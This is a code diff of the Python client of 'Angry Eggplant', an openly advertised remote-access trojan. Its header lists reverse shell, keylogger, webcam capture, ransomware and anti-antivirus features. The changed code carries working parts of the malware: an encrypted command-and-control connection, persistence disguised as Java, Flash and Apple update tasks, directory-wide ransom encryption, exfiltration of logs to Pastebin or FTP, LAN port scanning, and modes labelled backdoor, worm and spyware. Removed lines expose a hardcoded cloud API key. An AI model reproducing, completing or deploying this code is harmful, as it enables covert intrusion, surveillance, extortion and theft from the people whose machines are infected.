@@ -2,27 +2,36 @@
 # -*- coding: utf-8 -*-
 
 '''
-Copyright (c) 2017 Angry Eggplant (https://github.com/colental/ae)
 
-Permission is hereby granted, free of charge, to any person obtaining a copy
-of this software and associated documentation files (the "Software"), to deal
-in the Software without restriction, including without limitation the rights
-to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
-copies of the Software, and to permit persons to whom the Software is
-furnished to do so, subject to the following conditions:
+   The Angry Eggplant Project
+    
+>  30+ modules - interactive & automated
+    - Reverse Shell   remotely access host machine with a shell
+    - Root Acess      obtain administrator privileges
+    - Keylogger       log user keystrokes with the window they were entered in
+    - Webcam          capture image/video or stream live
+    - Screenshot      snap shots of the host desktop
+    - Persistence     maintain access with 8 different persistence methods
+    - Packetsniffer   monitor host network traffic for valuable information
+    - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
+    - Ransom          encrypt host files and ransom them to the user for Bitcoin
+    - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
+    - Email           Outlook email of a logged in user can be accessed without authentication
+    - SMS             Send & receive SMS text messages with user's contacts
+    
+>  Portability - supports all major platforms & architectures
+    - no configuration - dynamically generates a unique client configured for the host
+    - no dependencies - packages, interpreter & modules all loaded remotely
+    - multiple file types - .exe (Windows), .sh (Linux) .app (Mac OS X), .apk (Android)
+    - normal mode - dropper is executable or application and disguised as plugin update
+    - fileless mode - everything loaded remotely, never exists on disk 
+    
+>  Security
+    - state of the art encryption - AES cipher in authenticated OCB mode with 256-bit key
+    - Diffie-Hellman Key Agreement method - key is secure even on monitored networks
+    - secure communication - message confidentiality, authenticity, & integrity
+    - anti-forensics countermeasures - sandbox detection, virtual machine detection
 
-THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
-COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
-
-THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
-IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
-FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
-
-IN NO EVENT SHALL THE
-AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
-LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
-OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
-SOFTWARE.
 '''
 
 
@@ -49,49 +58,46 @@ def config(*arg, **options):
 
 
 class Client():
-
     '''
-    >  30+ modules - interactive & automated
-        - Reverse Shell   remotely access host machine with a shell
-        - Root Acess      obtain administrator privileges
-        - Keylogger       log user keystrokes with the window they were entered in
-        - Webcam          capture image/video or stream live
-        - Screenshot      snap shots of the host desktop
-        - Persistence     maintain access with 8 different persistence methods
-        - Packetsniffer   monitor host network traffic for valuable information
-        - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
-        - Ransom          encrypt host files and ransom them to the user for Bitcoin
-        - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
-        - Email           Outlook email of a logged in user can be accessed without authentication
-        - SMS             Send & receive SMS text messages with user's contacts
-        
-    >  Portability - supports all major platforms & architectures
-        - automated payload configuration
-        - zero dependencies whatsoever (not even Python is required)
-        - dynamically compiles unique stagers as native executables to avoid anti-virus detection
-        - no downloads, no installations, no configuration, no dependencies
-        - compatible with PyInstaller
-        
-    >  Security - encrypted communication, stealth, anti-forensics & anti-anti-virus features
-        - all communication is encrypted - between clients and server
-        - AES cipher in OCB mode - secure data confidentiality, integrity, and authenticity
-        - 256 bit session keys - generated via Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
-        '''
+    Copyright (c) 2017 Angry Eggplant (https://github.com/colental/ae)
+
+    Permission is hereby granted, free of charge, to any person obtaining a copy
+    of this software and associated documentation files (the "Software"), to deal
+    in the Software without restriction, including without limitation the rights
+    to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+    copies of the Software, and to permit persons to whom the Software is
+    furnished to do so, subject to the following conditions:
+
+    THE ABOVE COPYRIGHT NOTICE AND THIS PERMISSION NOTICE SHALL BE INCLUDED IN ALL
+    COPIES OR SUBSTANTIAL PORTIONS OF THE SOFTWARE.
+
+    THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+    IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+    FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
+
+    IN NO EVENT SHALL THE
+    AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+    LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+    OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+    SOFTWARE.
+    '''
 
     _debug   = True
     _abort   = False
     _lock    = threading.Lock()
     _jobs    = Queue.Queue()
+    _flags   = {'prompt': threading.Event(),'connection': threading.Event(), 'mode': threading.Event()}
     __name__ = 'Client'
 
-    def __init__(self, *args, **kwargs):
-        self._sysinfo = self._get_system_info()
-        self._command = self._get_all_commands()
+    def __init__(self, config=None):
+        self._sysinfo = self._get_system()
+        self._command = self._get_commands()
         self._workers = collections.OrderedDict()
         self._results = collections.OrderedDict()
         self._network = collections.OrderedDict()
         self._session = collections.OrderedDict()
-        self._stagers = collections.OrderedDict()
+        self._payloads = collections.OrderedDict()
+        
 
     
     @staticmethod
@@ -105,7 +111,7 @@ class Client():
     @staticmethod
     def _get_id():
         try:
-            return Crypto.Hash.MD5.new(Client._get_public_ip() + Client._get_mac_address()).hexdigest()
+            return Crypto.Hash.MD5.new(Client._get_ip() + Client._get_mac() + str(int(time.time()))).hexdigest()
         except Exception as e:
             Client.debug("{} error: {}".format(Client._get_id.func_name, str(e)))
 
@@ -119,27 +125,27 @@ class Client():
 
 
     @staticmethod
-    def _get_public_ip():
+    def _get_ip():
         try:
             return urllib2.urlopen('http://api.ipify.org').read()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_public_ip.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_ip.func_name, str(e)))
 
 
     @staticmethod
-    def _get_private_ip():
+    def _get_local():
         try:
             return socket.gethostbyname(socket.gethostname())
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_private_ip.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_local.func_name, str(e)))
 
 
     @staticmethod
-    def _get_mac_address():
+    def _get_mac():
         try:
             return ':'.join(hex(uuid.getnode()).strip('0x').strip('L')[i:i+2] for i in range(0,11,2)).upper()
         except Exception as e:
-            Client.debug("{} error: {}".format(Client._get_mac_address.func_name, str(e)))
+            Client.debug("{} error: {}".format(Client._get_mac.func_name, str(e)))
 
 
     @staticmethod
@@ -189,7 +195,7 @@ class Client():
             return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(x)-1))
         except Exception as e:
             Client.debug("{} error: {}".format(Client._get_random_var.func_name, str(e)))
-
+            
 
     @staticmethod            
     def _get_job_status(c):
@@ -359,26 +365,26 @@ class Client():
                 Client.debug("{} error: {}".format(Client.abort.func_name, str(e)))
 
 
-    def _get_system_info(self):
+    def _get_system(self):
         info = {}
-        for key in ['id', 'public_ip', 'private_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+        for key in ['id', 'ip', 'local', 'platform', 'mac', 'architecture', 'username', 'administrator', 'device']:
             value = '_get_%s' % key
             if hasattr(Client, value):
                 try:
                     info[key] = getattr(Client, value)()
                 except Exception as e:
-                    self.debug("{} error: {}".format(self._get_system_info.func_name, str(e)))
+                    self.debug("{} error: {}".format(self._get_system.func_name, str(e)))
         return info
 
     
-    def _get_all_commands(self):
+    def _get_commands(self):
         commands = {}
         for cmd in vars(Client):
             if hasattr(vars(Client)[cmd], 'command'):
                 try:
                     commands[cmd] = {'method': getattr(self, cmd), 'platforms': getattr(Client, cmd).platforms, 'usage': getattr(Client, cmd).usage, 'description': getattr(Client, cmd).func_doc.strip().rstrip()}
                 except Exception as e:
-                    Client.debug("{} error: {}".format(self._get_all_commands.func_name, str(e)))
+                    Client.debug("{} error: {}".format(self._get_commands.func_name, str(e)))
         return commands
 
 
@@ -394,7 +400,43 @@ class Client():
             self.debug("{} error: {}".format(self._get_restart.func_name, str(e)))
 
 
-    def _get_standby_mode(self):
+    def _mode(self, mode):
+        try:
+            if 'passive' in mode:
+                if self._mode_passive.func_name not in self._workers or not self._workers.get(self._mode_passive.func_name).is_alive():
+                    self._workers[self._mode_passive.func_name] = threading.Thread(target=self._mode_passive, name=time.time())
+                    self._workers[self._mode_passive.func_name].daemon = True
+                    self._workers[self._mode_passive.func_name].start()
+            elif 'auto' in mode:
+                if self._mode_autonomous.func_name not in self._workers or not self._workers.get(self._mode_autonomous.func_name).is_alive():
+                    self._workers[self._mode_autonomous.func_name] = threading.Thread(target=self._mode_autonomous, name=time.time())
+                    self._workers[self._mode_autonomous.func_name].daemon = True
+                    self._workers[self._mode_autonomous.func_name].start()
+            elif 'shell' in mode:
+                if self._server_prompt.func_name not in self._workers or not self._workers.get(self._server_prompt.func_name).is_alive():
+                    self._workers[self._server_prompt.func_name] = threading.Thread(target=self._server_prompt, name=time.time())
+                    self._workers[self._server_prompt.func_name].daemon = True
+                    self._workers[self._server_prompt.func_name].start()
+                if self._reverse_tcp_shell.func_name not in self._workers or not self._workers.get(self._reverse_tcp_shell.func_name).is_alive():
+                    self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
+                    self._workers[self.reverse_tcp_shell.func_name].daemon = True
+                    self._workers[self.reverse_tcp_shell.func_name].start()
+            else:
+                return self._mode('shell')
+        except Exception as e:
+            self.debug("{} error: {}".format(self._mode.func_name, str(e)))
+        return mode
+
+
+    def _mode_autonomous(self):
+        try:
+            self.debug('warning: autonomous mode is still in development')
+        except Exception as e:
+            self.debug("{} error: {}".format(self._mode_autonomous.func_name, str(e)))
+
+
+    @config(tasks=['keylogger start', 'ps monitor'])
+    def _mode_passive(self):
         try:
             addr = None
             try:
@@ -409,12 +451,12 @@ class Client():
                     except: pass
                 else:
                     self.connect()
-                if self._session['connection'].is_set():
+                if self._flags['connection'].is_set():
                     break
             return self.reverse_tcp_shell()
         except Exception as e:
-            self.debug('{} error: {}'.format(self._get_standby_mode.func_name, str(e)))
-        return self._get_restart(self._get_standby_mode.func_name)        
+            self.debug('{} error: {}'.format(self._mode_passive.func_name, str(e)))
+        return self._get_restart(self._mode_passive.func_name)        
 
 
     def _get_public_key(self, *args, **kwargs):
@@ -522,7 +564,7 @@ class Client():
                     host = ftplib.FTP(**creds)
                 except:
                     return "Upload failed - remote FTP server authorization error"
-                addr = self._get_public_ip()
+                addr = self._get_ip()
                 if 'tmp' not in host.nlst():
                     host.mkd('/tmp')
                 if addr not in host.nlst('/tmp'):
@@ -593,7 +635,7 @@ class Client():
             if os.path.isfile(arg):
                 return self._ransom_encrypt(arg)
             elif os.path.isdir(arg):
-                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(arg, lambda _, d, f: [self._jobs.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
+                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(arg, lambda _, d, f: [self._queue.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
                 self._workers["ransom-tree-walk"].daemon = True
                 self._workers["ransom-tree-walk"].start()
                 for i in range(1,10):
@@ -629,7 +671,7 @@ class Client():
                 path = cmd2.partition(' ')[2].replace('?','/')
                 if 'ransom' in cmd1 and 'encrypt' in cmd2 and os.path.exists(path):
                     aes_key = value.get('result')
-                    self._jobs.put_nowait((self._ransom_decrypt, (rsa_key, aes_key, path)))
+                    self._queue.put_nowait((self._ransom_decrypt, (rsa_key, aes_key, path)))
             for i in range(1,10):
                 self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
                 self._workers["ransom-%d" % i].daemon = True
@@ -785,7 +827,7 @@ class Client():
         try:
             if self._scan_ping(host):
                 for port in [21,22,23,25,53,80,110,111,135,139,143,179,443,445,514,993,995,1433,1434,1723,3306,3389,8000,8008,8443,8888]:
-                    self._jobs.put_nowait((self._scan_port, (host, port)))
+                    self._queue.put_nowait((self._scan_port, (host, port)))
                 for x in xrange(10):
                     self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
                     self._workers['scanner-%d' % x].daemon = True
@@ -806,7 +848,7 @@ class Client():
             lan  = []
             for i in xrange(1,255):
                 lan.append(stub % i)
-                self._jobs.put_nowait((self._scan_ping, stub % i))
+                self._queue.put_nowait((self._scan_ping, stub % i))
             for _ in xrange(10):
                 x = random.randrange(100)
                 self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
@@ -814,7 +856,7 @@ class Client():
                 self._workers['scanner-%d' % x].start()
             self._workers['scanner-%d' % x].join()
             for ip in lan:
-                self._jobs.put_nowait((self._scan_host, ip))
+                self._queue.put_nowait((self._scan_host, ip))
             for n in xrange(10):
                 x = random.randrange(100)
                 self._workers['scanner-%d' % x] = threading.Thread(target=self._task_threader, name=time.time())
@@ -987,8 +1029,8 @@ class Client():
 
     @config(platforms=['win32','linux2','darwin'])
     def _persistence_add_hidden_file(self, *args, **kwargs):
-        if len(self._stagers):
-            value = random.choice(self._stagers)
+        if len(self._payloads):
+            value = random.choice(self._payloads)
             if value and os.path.isfile(value):
                 try:
                     if os.name is 'nt':
@@ -1025,8 +1067,8 @@ class Client():
     @config(platforms=['linux2'])
     def _persistence_add_crontab_job(self, minutes=10, name='flashplayer'):
         try:
-            if len(self._stagers):
-                value = random.choice(self._stagers)
+            if len(self._payloads):
+                value = random.choice(self._payloads)
                 if value and os.path.isfile(value):
                     if not os.path.isdir('/var/tmp'):
                         os.makedirs('/var/tmp')
@@ -1073,8 +1115,8 @@ class Client():
     @config(platforms=['darwin'])
     def _persistence_add_launch_agent(self,  name='com.apple.update.manager'):
         try:
-            if len(self._stagers):
-                value = random.choice(self._stagers)
+            if len(self._payloads):
+                value = random.choice(self._payloads)
                 if value and os.path.isfile(value):
                     code    = self._server_request('resource bash')
                     label   = name
@@ -1110,8 +1152,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_scheduled_task(self, name='Java-Update-Manager'):
-        if len(self._stagers):
-            value = random.choice(self._stagers)
+        if len(self._payloads):
+            value = random.choice(self._payloads)
             if value and os.path.isfile(value):
                 tmpdir      = os.path.expandvars('%TEMP%')
                 task_run    = os.path.join(tmpdir, name + os.path.splitext(value)[1])
@@ -1140,8 +1182,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_startup_file(self, name='Java-Update-Manager'):
-        if len(self._stagers):
-            value = random.choice(self._stagers)
+        if len(self._payloads):
+            value = random.choice(self._payloads)
             if value and os.path.isfile(value):
                 try:
                     appdata = os.path.expandvars("%AppData%")
@@ -1176,8 +1218,8 @@ class Client():
 
     @config(platforms=['win32'])
     def _persistence_add_registry_key(self, name='Java-Update-Manager'):
-        if len(self._stagers):
-            value = random.choice(self._stagers)
+        if len(self._payloads):
+            value = random.choice(self._payloads)
             if value and os.path.isfile(value):
                 try:
                     self._get_registry_key(name, value)
@@ -1204,8 +1246,8 @@ class Client():
     def _persistence_add_powershell_wmi(self, command=None, task_name='Java-Update-Manager'):
         try:
             cmd_line  = ""
-            if len(self._stagers):
-                value = random.choice(self._stagers)
+            if len(self._payloads):
+                value = random.choice(self._payloads)
                 if value and os.path.isfile(value):
                     cmd_line = 'start /b /min {}'.format(value)
                 elif command:
@@ -1370,7 +1412,7 @@ class Client():
             self.debug("{} error: {}".format(self._ps_list.func_name, str(e)))
 
 
-    def _ps_search(self, arg, **kwargs):
+    def _ps_search(self, arg):
         try:
             if not isinstance(arg, str) or not len(arg):
                 return "usage: process search [PID/name]"
@@ -1411,10 +1453,10 @@ class Client():
             self.debug("{} error: {}".format(self._ps_kill.func_name, str(e)))
 
 
-    def _ps_monitor(self, keyword=None):
+    def _ps_monitor(self, arg):
         try:
-            if not len(self.process.buffer.getvalue()):
-                self.process.buffer.write("Time, User , Executable, PID, Privileges")
+            if not len(self.ps.buffer.getvalue()):
+                self.ps.buffer.write("Time, User , Executable, PID, Privileges\n")
             pythoncom.CoInitialize()
             c = wmi.WMI()
             process_watcher = c.Win32_Process.watch_for("creation")
@@ -1429,10 +1471,10 @@ class Client():
                     parent_pid  = new_process.ParentProcessId
                     output      = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
                     if not keyword:
-                        self.process.buffer.write(output)
+                        self.ps.buffer.write(output)
                     else:
                         if keyword in output:
-                            self.process.buffer.write(output)
+                            self.ps.buffer.write(output)
                 except Exception as e1:
                     self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e1)))
                 if self._abort:
@@ -1444,12 +1486,12 @@ class Client():
     def _ps_logger(self, *args, **kwargs):
         try:
             while True:
-                if self.process.buffer.tell() > self.process.max_bytes:
+                if self.ps.buffer.tell() > self.ps.max_bytes:
                     try:
                         task_id = self._task_id(self._ps_monitor.func_name)
-                        result  = self._upload_pastebin(self.process.buffer) if 'ftp' not in args else self._Upload_ftp(self.process.buffer)
+                        result  = self._upload_pastebin(self.ps.buffer) if 'ftp' not in args else self._Upload_ftp(self.ps.buffer)
                         self._results[task_id] = {'Client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'process monitor', 'result': result}
-                        self.process.buffer.reset()
+                        self.ps.buffer.reset()
                     except Exception as e:
                         self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
                 elif self._abort:
@@ -1460,44 +1502,27 @@ class Client():
             self.debug("{} error: {}".format(self._ps_logger.func_name, str(e)))
 
 
-    def _ps_start_monitor(self, *args, **kwargs):
+    def _ps_monitor_start(self, *args, **kwargs):
         try:
-            self._workers[self._ps_monitor.func_name] = threading.Thread(target=self._ps_monitor, args=args, kwargs=kwargs, name=time.time()) 
-            self._workers[self._ps_monitor.func_name].daemon = True
-            self._workers[self._ps_monitor.func_name].start()
-            self._workers[self._ps_logger.func_name] = threading.Thread(target=self._ps_logger, name=time.time())
-            self._workers[self._ps_logger.func_name].daemon = True
-            self._workers[self._ps_logger.func_name].start()
+            if self._ps_monitor.func_name not in self._workers or not self._workers.get(self._ps_monitor.func_name).is_alive():
+                self._workers[self._ps_monitor.func_name] = threading.Thread(target=self._ps_monitor, args=args, kwargs=kwargs, name=time.time()) 
+                self._workers[self._ps_monitor.func_name].daemon = True
+                self._workers[self._ps_monitor.func_name].start()
+            if self._ps_logger.func_name not in self._workers or not self._workers.get(self._ps_logger.func_name).is_alive():
+                self._workers[self._ps_logger.func_name] = threading.Thread(target=self._ps_logger, name=time.time())
+                self._workers[self._ps_logger.func_name].daemon = True
+                self._workers[self._ps_logger.func_name].start()
             return "Monitoring process creation and uploading logs"
         except Exception as e:
             self.debug("{} error: {}".format(self._ps_monitor.func_name, str(e)))
 
 
-    def _server_addr(self, *args, **kwargs):
-        try:
-            if self._debug:
-                return socket.gethostbyname(socket.gethostname())
-            else:
-                req = urllib2.Request('https://api.vultr.com/v1/server/list_ipv4?SUBID=11307117')
-                req.headers = {'API-Key': 'IDUC6I6QEGMSPWJMNID6TS74QV7I2ORBVI3Q'}
-                res = json.loads(urllib2.urlopen(req).read())
-                ip  = res[res.keys()[0]][0].get('ip')
-                if self._get_if_ipv4(ip):
-                    return ip
-                else:
-                    self.debug("{} returned invalid IPv4 address: '{}'".format(self._get_server_addr.func_name, str(ip)))
-        except Exception as e:
-            self.debug("{} error: {}".format(self._server_addr.func_name, str(e)))
-
-
     def _server_send(self, **kwargs):    
         try:
-            if self._session['connection'].wait(timeout=3.0):
+            if self._flags['connection'].wait(timeout=3.0):
                 buff = kwargs.get('result')
-                print(buff)
                 kwargs.update({'result': buff[:48000]})
                 data = self._aes_encrypt(json.dumps(kwargs), self._session['key'])
-                print(data)
                 self._session['socket'].send(data + '\n')
                 if not len(buff[48000:]):
                     return
@@ -1527,14 +1552,32 @@ class Client():
                 self.debug('{} error: {}'.format(self._server_recv.func_name, str(e2)))
                 
  
+    def _server_addr(self, *args, **kwargs):
+        try:
+            if self._debug:
+                return socket.gethostbyname(socket.gethostname())
+            else:
+                url, api = urllib.urlopen(kwargs.get('config')).read().splitlines()
+                req = urllib2.Request(url)
+                req.headers = {'API-Key': api}
+                res = json.loads(urllib2.urlopen(req).read())
+                ip  = res[res.keys()[0]][0].get('ip')
+                if self._get_if_ipv4(ip):
+                    return ip
+                else:
+                    self.debug("{} returned invalid IPv4 address: '{}'".format(self._get_server_addr.func_name, str(ip)))
+        except Exception as e:
+            self.debug("{} error: {}".format(self._server_addr.func_name, str(e)))
+
+
     def _server_connect(self, port=1337):
         try:
             host = self._server_addr()
-            self._session['connection'] = threading.Event()
+            self._flags['connection'] = threading.Event()
             self._session['socket'] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self._session['socket'].connect((host, port))
             self._session['socket'].setblocking(True)
-            self._session['connection'].set() 
+            self._flags['connection'].set() 
             return self._session['socket']
         except Exception as e:
             self.debug("{} error: {}".format(self._server_connect.func_name, str(e)))
@@ -1542,45 +1585,49 @@ class Client():
 
 
     def _server_prompt(self, *args, **kwargs):
-        self._session['prompt'] = threading.Event()
-        self._session['prompt'].set()
+        self._flags['prompt'] = threading.Event()
+        self._flags['prompt'].set()
         while True:
             try:
-                self._session['prompt'].wait()
+                self._flags['mode'].wait()
+                self._flags['prompt'].wait()
                 self._server_send(**{'task': '0'*64, 'Client': self._sysinfo['id'], 'session': self._session['id'], 'command': 'prompt', 'result': '[%d @ {}]>'.format(os.getcwd())})
-                self._session['prompt'].clear()
+                self._flags['prompt'].clear()
             except Exception as e:
                 self.debug("{} error: {}".format(self.prompt.func_name, str(e)))
-                self._session['prompt'].clear()
+                self._flags['prompt'].clear()
 
 
-    def _server_request(self, **resources):
+    def _server_request(self, request):
+        self.debug('sending request: %s' % request)
+        host, port = self._session['socket'].getpeername() 
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((host, port + 1))
+        task = {'client': self._sysinfo.get('id'), 'request':  request, 'result': ''}
+        sock.sendall(self._aes_encrypt(json.dumps(task), self._session.get('key')) + '\n')
+        buf =  ""
+        attempts = 1
+        while '\n' not in buf:
+            try:
+                buf += sock.recv(4096)
+            except (socket.error, socket.timeout):
+                if attempts <= 3:
+                    self.debug('Attempt %d failed - re-attempting to retreive resource from server' % attempts)
+                    attempts += 1
+                    continue
+                else:
+                    break
+        if buf:
+            data = self._aes_decrypt(buf.rstrip(), self._session.get('key')).strip().rstrip()
+            task = json.loads(data)
         try:
-            if self._session.get('connection').wait(timeout=3.0):
-                self._session['socket'].sendall(self._aes_encrypt(json.dumps({'task': '0' * 32, 'client': self._sysinfo.get('id'), 'session': self._session.get('id'), 'command': 'request %s' % resource})))
-                buf =  ""
-                attempts = 1
-                while '\n' not in buf:
-                    try:
-                        buf += self._session['socket'].recv(4096)
-                    except (socket.error, socket.timeout):
-                        if attempts <= 3:
-                            self.debug('Attempt %d failed - re-attempting to retreive resource from server' % attempts)
-                            attempts += 1
-                            continue
-                        else:
-                            break
-                if buf:
-                    result  = self._aes_decrypt(buf.rstrip(), self._session.get('key')).strip().rstrip()
-                    task    = json.loads(jresult)
-                    return task.get('result')
-        except Exception as e:
-            self.debug("{} error: {}".format(self._server_request.func_name, str(e)))
-
+            sock.close()
+        except: pass
+        return task.get('result')
 
     def _session_id(self):
         try:
-            if self._session['connection'].wait(timeout=3.0):
+            if self._flags['connection'].wait(timeout=3.0):
                 self._session['socket'].sendall(self._aes_encrypt(json.dumps(self._sysinfo), self._session['key']) + '\n')
                 buf      = ""
                 attempts = 1
@@ -1595,7 +1642,9 @@ class Client():
                         else:
                             break
                 if buf:
-                    self._session['id'] = self._aes_decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
+                    data = self._aes_decrypt(buf.rstrip(), self._session['key']).strip().rstrip()
+                    self._sysinfo = json.loads(data)
+                    self._session['id'] = self._sysinfo['session']
                     return self._session['id']
             else:
                 self.debug("{} timed out".format(self._session_id.func_name))
@@ -1606,7 +1655,7 @@ class Client():
 
     def _session_key(self):
         try:
-            if self._session['connection'].wait(timeout=3.0):
+            if self._flags['connection'].wait(timeout=3.0):
                 g  = 2
                 p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
                 a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
@@ -1633,9 +1682,9 @@ class Client():
         try:
             while True:
                 try:
-                    method, task = self._jobs.get_nowait()
+                    method, task = self._queue.get_nowait()
                     method(task)
-                    self._jobs.task_done()
+                    self._queue.task_done()
                 except:
                     break
         except Exception as e:
@@ -1890,11 +1939,11 @@ class Client():
         """
         try:
             if 'connection' not in self._session:
-                self._session['connection'] = threading.Event()
+                self._flags['connection'] = threading.Event()
             if 'prompt' not in self._session:
-                self._session['prompt'] = threading.Event()
-            self._session['connection'].clear()
-            self._session['prompt'].clear()
+                self._flags['prompt'] = threading.Event()
+            self._flags['connection'].clear()
+            self._flags['prompt'].clear()
         except Exception as e:
             self.debug("{} error: {}".format(self.kill.func_name, str(e)))
         try:
@@ -2107,17 +2156,19 @@ class Client():
         return result
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
-    def standby(self):
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='mode [option]')
+    def mode(self, *args, **kwargs):
         """
-        disconnect from server but keep Client alive
+        display/change run mode (use 'mode help' for list of modes)
         """
         try:
-            self._workers[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
-            self._workers[self.standby.func_name].start()
-            return "Standby mode enabled. Awaiting further instructions.".format(self._sysinfo.get('ip'))
+            if not args or 'help' in args:
+                return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("shell"): "interactive shell (backdoor mode)", "{:>12}".format("auto"): "autonomous (worm mode)", "{:>12}".format("passive"): "non-interactive recon (spyware mode)"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
+            else:
+                return self._mode(args[0])
         except Exception as e:
-            self.debug("{} error: {}".format(self.standby.func_name, str(e)))
+            self.debug("{} error: {}".format(self.passive.func_name, str(e)))
+            return str("usage: %s\n\x20\x20\x20\x20options: %s" % (self.mode.usage, json.dumps({"{:>12}".format("shell"): "interactive shell (backdoor mode)", "{:>12}".format("auto"): "autonomous (worm mode)", "{:>12}".format("passive"): "non-interactive recon (spyware mode)"},indent=2,separators=('','\t')))).replace('"', '').replace('}','').replace('{','')
 
 
     @config(platforms=['win32'], command=True, usage='escalate')
@@ -2128,9 +2179,9 @@ class Client():
         try:
             if self._get_administrator():
                 return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
-            if self._stagers.get('established') and os.path.isfile(self._stagers.get('result')):
+            if self._payloads.get('established') and os.path.isfile(self._payloads.get('result')):
                 if os.name is 'nt':
-                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._stagers.get('result')))
+                    win32com.shell.shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(self._payloads.get('result')))
                 else:
                     return "Privilege escalation not yet available on '{}'".format(sys.platform)
         except Exception as e:
@@ -2162,8 +2213,8 @@ class Client():
             return "File '{}' not found".format(str(path))
 
 
-    @config(platforms=['win32','linux2','darwin'], command=True, usage='dropper [name] [icon]')
-    def dropper(self, args=None):
+    @config(platforms=['win32','linux2','darwin'], command=True, usage='payload [name] [icon]')
+    def payload(self, args=None):
         """
         generate payload dropper as portable executable
         """
@@ -2180,8 +2231,8 @@ class Client():
                         path = self._payload_application(path)
                     else:
                         path = self._payload_executable(path)
-                self._stagers[name] = path
-                return json.dumps({name: self._stagers.get(name)})
+                self._payloads[name] = path
+                return json.dumps({name: self._payloads.get(name)})
         except Exception as e:
             return "{} error: {}".format(self.payload.func_name, str(e))
             
@@ -2254,19 +2305,16 @@ class Client():
                 return self.persistence.usage
             else:
                 target = '_persistence_{}_{}'
-                cmd, _, method = str(args).partition(' ')
+                cmd, _, action = str(args).partition(' ')
                 methods = [m for m in self.persistence.methods if sys.platform in self.persistence.methods[m]['platforms']]
                 if cmd not in ('add','remove'):
                     return self.persistence.usage + str('\nmethods: %s' % ', '.join([str(m) for m in self.persistence.methods if sys.platform in getattr(Client, '_persistence_add_%s' % m).platforms]))
-                elif method == 'all':
-                    payload = self.dropper(random.choice(['java','flash','chrome','firefox']))
-                    for method in methods:
+                if not self._payloads:
